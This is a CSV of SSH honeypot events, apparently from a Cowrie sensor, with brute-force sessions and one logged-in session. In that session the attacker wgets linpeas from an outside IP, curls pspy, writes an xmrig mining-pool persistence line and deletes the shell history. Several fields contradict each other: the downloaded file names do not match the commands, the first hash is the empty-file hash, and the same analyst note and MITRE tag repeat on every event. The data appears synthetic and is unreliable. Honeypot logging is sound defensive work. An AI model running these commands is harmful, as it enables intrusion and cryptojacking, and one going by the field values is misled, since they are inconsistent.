event_id,session_id,timestamp,event_type,honeypot_id,src_ip,src_port,dst_ip,dst_port,protocol,username,password,login_success,command,command_index,country,asn,isp,attack_type,mitre_technique_id,mitre_technique_name,severity,file_downloaded,c2_ip,sha256_payload,session_duration_sec,bytes_sent,bytes_received,alert_tag,false_positive,thehive_case_id,misp_event_uuid,analyst_note
EVT-0000337,64e48f87ddaf,2026-04-01T04:51:23.751Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,ls /home/ubuntu/TaskBoard,2,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000338,64e48f87ddaf,2026-04-01T04:51:29.527Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,ls -la /home/ubuntu/TaskBoard/Backend/,3,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000339,64e48f87ddaf,2026-04-01T04:51:37.426Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,ls /home/ubuntu/TaskBoard/Backend,4,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000340,64e48f87ddaf,2026-04-01T04:51:41.807Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,wget -q http://45.95.168.200/linpeas.sh -O /tmp/linpeas.sh,5,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,sshd,185.191.127.231,var/lib/cowrie/downloads/e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000341,64e48f87ddaf,2026-04-01T04:51:54.648Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,curl -o /tmp/pspy64 https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64,6,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,backdoor.elf,194.147.140.65,var/lib/cowrie/downloads/fcde2b2edba56bf408601fb721fe9b5c338d10ee429ea04fae5511b68fbf8fb9,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000342,64e48f87ddaf,2026-04-01T04:51:57.028Z,cowrie.session.file_upload,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,,,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,pspy64,194.165.16.78,var/lib/cowrie/downloads/b14a7b8059d9c055954c92674ce60032d8e5f6e3821f5da55134efc23a23bd3d,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000343,64e48f87ddaf,2026-04-01T04:52:11.685Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,nproc --all,7,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000344,64e48f87ddaf,2026-04-01T04:52:30.199Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,echo '/tmp/.xmrig -o pool.minexmr.com:4444 -u WALLET -p x &' >> /tmp/.init.sh,8,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000345,64e48f87ddaf,2026-04-01T04:52:34.084Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,rm -f ~/.bash_history,9,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000346,64e48f87ddaf,2026-04-01T04:52:51.982Z,cowrie.command.input,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,quit,10,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,,,,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000347,64e48f87ddaf,2026-04-01T04:52:54.209Z,cowrie.session.closed,cowrie-ec2-prod-01,111.49.69.247,64260,172.18.0.3,2222,ssh,mysql,1q2w3e4r,true,,,UA,AS6849,JSC Ukrtelecom,cryptomining,T1033,System Owner/User Discovery,critical,,,,740,14046,13920,cryptominer,false,HIVE-5835,cdcdf1bc-6aa9-4d1a-b820-270cd7de3c72,Attempted to read .env JWT secret
EVT-0000348,d86f0f20edf5,2026-03-13T17:07:47.000Z,cowrie.session.connect,cowrie-ec2-prod-01,174.210.106.19,55688,172.18.0.3,2222,ssh,,,,,,KR,AS9644,SK Broadband,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000349,d86f0f20edf5,2026-03-13T17:07:47.136Z,cowrie.client.version,cowrie-ec2-prod-01,174.210.106.19,55688,172.18.0.3,2222,ssh,,,,,,KR,AS9644,SK Broadband,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000350,d86f0f20edf5,2026-03-13T17:07:47.417Z,cowrie.client.kex,cowrie-ec2-prod-01,174.210.106.19,55688,172.18.0.3,2222,ssh,,,,,,KR,AS9644,SK Broadband,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000351,d86f0f20edf5,2026-03-13T17:07:50.378Z,cowrie.login.failed,cowrie-ec2-prod-01,174.210.106.19,55688,172.18.0.3,2222,ssh,root,password,false,,,KR,AS9644,SK Broadband,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000352,d86f0f20edf5,2026-03-13T17:07:52.443Z,cowrie.login.failed,cowrie-ec2-prod-01,174.210.106.19,55688,172.18.0.3,2222,ssh,nagios,password,false,,,KR,AS9644,SK Broadband,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000353,d86f0f20edf5,2026-03-13T17:07:53.575Z,cowrie.login.failed,cowrie-ec2-prod-01,174.210.106.19,55688,172.18.0.3,2222,ssh,operator,raspberry,false,,,KR,AS9644,SK Broadband,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000354,d86f0f20edf5,2026-03-13T17:07:56.521Z,cowrie.login.failed,cowrie-ec2-prod-01,174.210.106.19,55688,172.18.0.3,2222,ssh,www,abc123,false,,,KR,AS9644,SK Broadband,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000355,d86f0f20edf5,2026-03-13T17:07:58.858Z,cowrie.session.closed,cowrie-ec2-prod-01,174.210.106.19,55688,172.18.0.3,2222,ssh,www,abc123,false,,,KR,AS9644,SK Broadband,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,28,1887,1498,bruteforce,false,,,ZMap/Masscan initiated scan
EVT-0000356,a514b1f3ce4e,2026-04-11T15:31:43.000Z,cowrie.session.connect,cowrie-ec2-prod-01,57.10.91.216,62154,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,HIVE-6607,,ZMap/Masscan initiated scan
EVT-0000357,a514b1f3ce4e,2026-04-11T15:31:43.309Z,cowrie.client.version,cowrie-ec2-prod-01,57.10.91.216,62154,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,HIVE-6607,,ZMap/Masscan initiated scan
EVT-0000358,a514b1f3ce4e,2026-04-11T15:31:44.126Z,cowrie.client.kex,cowrie-ec2-prod-01,57.10.91.216,62154,172.18.0.3,2222,ssh,,,,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,HIVE-6607,,ZMap/Masscan initiated scan
EVT-0000359,a514b1f3ce4e,2026-04-11T15:31:45.790Z,cowrie.login.failed,cowrie-ec2-prod-01,57.10.91.216,62154,172.18.0.3,2222,ssh,admin,654321,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,HIVE-6607,,ZMap/Masscan initiated scan
EVT-0000360,a514b1f3ce4e,2026-04-11T15:31:47.995Z,cowrie.login.failed,cowrie-ec2-prod-01,57.10.91.216,62154,172.18.0.3,2222,ssh,redis,system,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,HIVE-6607,,ZMap/Masscan initiated scan
EVT-0000361,a514b1f3ce4e,2026-04-11T15:31:50.884Z,cowrie.session.closed,cowrie-ec2-prod-01,57.10.91.216,62154,172.18.0.3,2222,ssh,redis,system,false,,,TH,AS23969,TOT Public Company Limited,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,22,2651,180,bruteforce,false,HIVE-6607,,ZMap/Masscan initiated scan
EVT-0000362,aefed156566e,2026-03-12T10:34:55.000Z,cowrie.session.connect,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000363,aefed156566e,2026-03-12T10:34:55.373Z,cowrie.client.version,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000364,aefed156566e,2026-03-12T10:34:55.582Z,cowrie.client.kex,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,,,,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000365,aefed156566e,2026-03-12T10:34:57.066Z,cowrie.login.failed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,webmaster,qwerty,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000366,aefed156566e,2026-03-12T10:34:59.318Z,cowrie.login.failed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,postgres,12345678,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000367,aefed156566e,2026-03-12T10:35:00.587Z,cowrie.login.failed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,backup,qwerty,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000368,aefed156566e,2026-03-12T10:35:02.143Z,cowrie.login.failed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,centos,111111,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000369,aefed156566e,2026-03-12T10:35:03.724Z,cowrie.login.failed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,centos,linux,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000370,aefed156566e,2026-03-12T10:35:05.163Z,cowrie.login.failed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,test,123456789,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000371,aefed156566e,2026-03-12T10:35:07.182Z,cowrie.login.failed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,manager,1q2w3e4r,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000372,aefed156566e,2026-03-12T10:35:09.528Z,cowrie.login.failed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,oracle,changeme,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000373,aefed156566e,2026-03-12T10:35:13.617Z,cowrie.session.closed,cowrie-ec2-prod-01,122.103.30.183,61150,172.18.0.3,2222,ssh,oracle,changeme,false,,,TR,AS9121,Turk Telekomunikasyon AS,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,20,2205,636,bruteforce,false,,,Mirai variant fingerprint detected
EVT-0000374,0a9bb3695899,2026-03-09T15:04:42.000Z,cowrie.session.connect,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000375,0a9bb3695899,2026-03-09T15:04:42.388Z,cowrie.client.version,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000376,0a9bb3695899,2026-03-09T15:04:42.690Z,cowrie.client.kex,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,,,,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000377,0a9bb3695899,2026-03-09T15:04:45.294Z,cowrie.login.failed,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,ec2-user,888888,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000378,0a9bb3695899,2026-03-09T15:04:47.930Z,cowrie.login.failed,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,ubuntu,default,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000379,0a9bb3695899,2026-03-09T15:04:50.006Z,cowrie.login.failed,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,www,ubuntu,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000380,0a9bb3695899,2026-03-09T15:04:51.346Z,cowrie.login.failed,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,ftp,888888,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000381,0a9bb3695899,2026-03-09T15:04:53.869Z,cowrie.login.failed,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,service,linux,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,,
EVT-0000382,0a9bb3695899,2026-03-09T15:04:56.913Z,cowrie.session.closed,cowrie-ec2-prod-01,62.187.227.207,64260,172.18.0.3,2222,ssh,service,linux,false,,,EG,AS8452,TE Data,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,26,1787,1175,bruteforce,false,,,
EVT-0000383,f0ce61975b43,2026-04-20T15:21:38.000Z,cowrie.session.connect,cowrie-ec2-prod-01,108.23.30.179,62474,172.18.0.3,2222,ssh,,,,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,true,,,Low-and-slow credential stuffing
EVT-0000384,f0ce61975b43,2026-04-20T15:21:38.206Z,cowrie.client.version,cowrie-ec2-prod-01,108.23.30.179,62474,172.18.0.3,2222,ssh,,,,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,true,,,Low-and-slow credential stuffing
EVT-0000385,f0ce61975b43,2026-04-20T15:21:38.912Z,cowrie.client.kex,cowrie-ec2-prod-01,108.23.30.179,62474,172.18.0.3,2222,ssh,,,,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,true,,,Low-and-slow credential stuffing
EVT-0000386,f0ce61975b43,2026-04-20T15:21:41.110Z,cowrie.login.failed,cowrie-ec2-prod-01,108.23.30.179,62474,172.18.0.3,2222,ssh,oracle,root,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,,,,bruteforce,true,,,Low-and-slow credential stuffing
EVT-0000387,f0ce61975b43,2026-04-20T15:21:45.214Z,cowrie.session.closed,cowrie-ec2-prod-01,108.23.30.179,62474,172.18.0.3,2222,ssh,oracle,root,false,,,DE,AS3320,Deutsche Telekom AG,ssh_bruteforce,T1110.003,Brute Force: Password Spraying,high,,,,7,2517,660,bruteforce,true,,,Low-and-slow credential stuffing
EVT-0000388,93925a8aa409,2026-03-26T20:44:29.000Z,cowrie.session.connect,cowrie-ec2-prod-01,252.132.192.184,64303,172.18.0.3,2222,ssh,,,,,,RU,AS8359,MTS PJSC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000389,93925a8aa409,2026-03-26T20:44:29.323Z,cowrie.client.version,cowrie-ec2-prod-01,252.132.192.184,64303,172.18.0.3,2222,ssh,,,,,,RU,AS8359,MTS PJSC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000390,93925a8aa409,2026-03-26T20:44:29.429Z,cowrie.client.kex,cowrie-ec2-prod-01,252.132.192.184,64303,172.18.0.3,2222,ssh,,,,,,RU,AS8359,MTS PJSC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000391,93925a8aa409,2026-03-26T20:44:30.102Z,cowrie.login.failed,cowrie-ec2-prod-01,252.132.192.184,64303,172.18.0.3,2222,ssh,postgres,default,false,,,RU,AS8359,MTS PJSC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,,,,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000392,93925a8aa409,2026-03-26T20:44:33.607Z,cowrie.session.closed,cowrie-ec2-prod-01,252.132.192.184,64303,172.18.0.3,2222,ssh,postgres,default,false,,,RU,AS8359,MTS PJSC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,high,,,,30,265,187,bruteforce,false,,,Low-and-slow credential stuffing
EVT-0000393,686d2b1baa01,2026-03-05T22:32:38.000Z,cowrie.session.connect,cowrie-ec2-prod-01,5.5.125.14,65210,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0000394,686d2b1baa01,2026-03-05T22:32:38.115Z,cowrie.client.version,cowrie-ec2-prod-01,5.5.125.14,65210,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0000395,686d2b1baa01,2026-03-05T22:32:38.622Z,cowrie.client.kex,cowrie-ec2-prod-01,5.5.125.14,65210,172.18.0.3,2222,ssh,,,,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0000396,686d2b1baa01,2026-03-05T22:32:40.435Z,cowrie.login.failed,cowrie-ec2-prod-01,5.5.125.14,65210,172.18.0.3,2222,ssh,ubuntu,abc123,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0000397,686d2b1baa01,2026-03-05T22:32:42.669Z,cowrie.login.failed,cowrie-ec2-prod-01,5.5.125.14,65210,172.18.0.3,2222,ssh,node,666666,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0000398,686d2b1baa01,2026-03-05T22:32:45.584Z,cowrie.login.failed,cowrie-ec2-prod-01,5.5.125.14,65210,172.18.0.3,2222,ssh,guest,iloveyou,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0000399,686d2b1baa01,2026-03-05T22:32:47.083Z,cowrie.login.failed,cowrie-ec2-prod-01,5.5.125.14,65210,172.18.0.3,2222,ssh,guest,666666,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,,,,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0000400,686d2b1baa01,2026-03-05T22:32:49.685Z,cowrie.session.closed,cowrie-ec2-prod-01,5.5.125.14,65210,172.18.0.3,2222,ssh,guest,666666,false,,,CN,AS4134,ChinaNet,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,medium,,,,4,630,725,bruteforce,true,,,Mirai variant fingerprint detected
EVT-0000401,44ce57b76323,2026-03-05T20:00:19.000Z,cowrie.session.connect,cowrie-ec2-prod-01,21.1.47.8,48038,172.18.0.3,2222,ssh,,,,,,PK,AS45595,PakNet LLC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,a70e9b5a-41ae-4272-9745-70364e58ac96,Automated SSH dictionary attack
EVT-0000402,44ce57b76323,2026-03-05T20:00:19.256Z,cowrie.client.version,cowrie-ec2-prod-01,21.1.47.8,48038,172.18.0.3,2222,ssh,,,,,,PK,AS45595,PakNet LLC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,a70e9b5a-41ae-4272-9745-70364e58ac96,Automated SSH dictionary attack
EVT-0000403,44ce57b76323,2026-03-05T20:00:20.035Z,cowrie.client.kex,cowrie-ec2-prod-01,21.1.47.8,48038,172.18.0.3,2222,ssh,,,,,,PK,AS45595,PakNet LLC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,a70e9b5a-41ae-4272-9745-70364e58ac96,Automated SSH dictionary attack
EVT-0000404,44ce57b76323,2026-03-05T20:00:20.781Z,cowrie.login.failed,cowrie-ec2-prod-01,21.1.47.8,48038,172.18.0.3,2222,ssh,centos,system,false,,,PK,AS45595,PakNet LLC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,a70e9b5a-41ae-4272-9745-70364e58ac96,Automated SSH dictionary attack
EVT-0000405,44ce57b76323,2026-03-05T20:00:23.551Z,cowrie.login.failed,cowrie-ec2-prod-01,21.1.47.8,48038,172.18.0.3,2222,ssh,hadoop,admin,false,,,PK,AS45595,PakNet LLC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,,,,bruteforce,false,,a70e9b5a-41ae-4272-9745-70364e58ac96,Automated SSH dictionary attack
EVT-0000406,44ce57b76323,2026-03-05T20:00:28.207Z,cowrie.session.closed,cowrie-ec2-prod-01,21.1.47.8,48038,172.18.0.3,2222,ssh,hadoop,admin,false,,,PK,AS45595,PakNet LLC,ssh_bruteforce,T1110.001,Brute Force: Password Guessing,low,,,,7,2623,601,bruteforce,false,,a70e9b5a-41ae-4272-9745-70364e58ac96,Automated SSH dictionary attack
